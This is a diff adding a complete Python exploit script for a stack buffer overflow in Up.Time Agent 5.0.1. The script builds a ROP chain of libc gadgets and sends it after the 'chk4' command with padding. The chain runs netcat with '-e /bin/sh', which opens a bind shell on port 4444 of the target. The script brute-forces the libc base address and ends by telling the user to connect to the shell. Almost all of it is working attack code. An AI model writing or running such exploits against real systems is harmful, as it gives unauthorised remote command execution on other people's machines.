@@ -1,0 +1,122 @@
+#!/usr/bin/python
+
+#
+# Stack based buffer overflow in Up.Time Agent 5.0.1 (i386).
+# This exploit will create a bind shell running on port
+# 4444 on the targeted host.
+#
+# Author: Denis Andzakovic
+# Date: 30/10/2013
+#
+
+import socket
+import sys
+import time
+import argparse
+from struct import pack
+
+def copyBytes(string, location):
+	pcaret = 0xd8f30 # pop ecx ; pop eax ;;
+	movbyte = 0x29ecf # mov [eax] ecx ;;
+	chain = pack("<I",pcaret+libcOffset)
+	chain += str(string) 
+	chain += pack("<I",location)
+	chain += pack("<I",movbyte+libcOffset)
+
+	return chain
+
+def copyNullByte(location):
+	# NOTE: eax *MUST* be null before hitting this chain.
+	popedx = 0x1a9e # pop edx ;;
+	nullcpy = 0x11f98d # mov [edx] al ; pop ebx ;;
+	chain = pack("<I",popedx+libcOffset)
+	chain += pack("<I",location) # address of NULL
+	chain += pack("<I",nullcpy+libcOffset)
+	chain += "BEES" # padding
+
+	return chain
+
+
+def sendSploit(ip, port, libcOffset):
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((ip, port))
+
+	customstack = 0x0804d380
+
+	# gadgets!
+	pcaret = 0xd8f30 # pop ecx ; pop eax ;;
+	popebx = 0x78af4 # pop ebx ;;
+	movbyte = 0x29ecf # mov [eax] ecx ;;
+	xoreax = 0x796bf # xor eax eax ;;
+	popedx = 0x1a9e # pop edx ;;
+	pcdret = 0x2a6eb # pop ecx ; pop edx ;;
+	addeax = 0x7faa8 # add eax 0xb ;;
+	callsys = 0xa10f5 # call gs:[0x10] ;;
+	nullcpy = 0x11f98d # mov [edx] al ; pop ebx ;;
+
+
+	# We will be executing "/bin//nc -lp4444 -e/bin/sh" using execve.
+	# Arguments passed to execve will be loaded at our custom stack location
+	rop = copyBytes("/bin",customstack)
+	rop += copyBytes("//nc",customstack+4)
+	rop += copyBytes("-lp4",customstack+9)
+	rop += copyBytes("444A",customstack+13)
+	rop += copyBytes("-e/b",customstack+17)
+	rop += copyBytes("in/b",customstack+21)
+	rop += copyBytes("shAA",customstack+24)
+	
+	# Set up the pointer array for execve()
+	rop += copyBytes(pack("<I",customstack),customstack+27)
+	rop += copyBytes(pack("<I",customstack+9),customstack+31)
+	rop += copyBytes(pack("<I",customstack+17),customstack+35)
+
+	# Set up Null bytes
+	rop += pack("<I",xoreax+libcOffset)
+	rop += copyNullByte(customstack+8)	
+	rop += copyNullByte(customstack+16)	
+	rop += copyNullByte(customstack+26)	
+	rop += copyNullByte(customstack+39)	
+	rop += copyNullByte(customstack+40)	
+	rop += copyNullByte(customstack+41)	
+	rop += copyNullByte(customstack+42)	
+
+	# Load parameters into relevant registers and Call execve
+	rop += pack("<I",pcdret+libcOffset) 
+	rop += pack("<I",customstack+27)
+	rop += pack("<I",customstack+39)
+	rop += pack("<I",popebx+libcOffset)
+	rop += pack("<I",customstack)
+	rop += pack("<I",xoreax+libcOffset)
+	rop += pack("<I",addeax+libcOffset)
+	rop += pack("<I",callsys+libcOffset)
+	rop += "AAAA"
+
+	djubre = "chk4 " + "A"*243
+
+	s.sendall(djubre + rop)
+	data = s.recv(1024)
+	s.close()
+
+parser = argparse.ArgumentParser(description='Uptime Agent 5.0.1 CHK4 Buffer Overflow')
+parser.add_argument('-d','--host', help="IP Address of target machine", required=True)
+parser.add_argument('-p','--port', help="Port of target machine", required=True)
+args = parser.parse_args()
+
+spinnerChars = ["|","/","-","\\","|","/","-","\\"]
+spinnerIndex = 0
+
+print "[+] Attacking " + args.host + " on port " + args.port
+libc= 0xb7000
+for i in range(0x000,0xfff):
+	libcOffset = (libc+i)*0x1000
+	print spinnerChars[spinnerIndex] ," - Bruteforcing LibC Offset - ", hex(libcOffset),"                       \r",
+	sys.stdout.flush()
+
+	# 0xb7123 = 0xb7123000
+	sendSploit(args.host,int(args.port),libcOffset)
+
+	spinnerIndex = spinnerIndex+1
+	if(spinnerIndex == 8):
+		spinnerIndex = 0
+
+print "\n[+] Completed! Access shell using 'nc <targethost> 4444'"
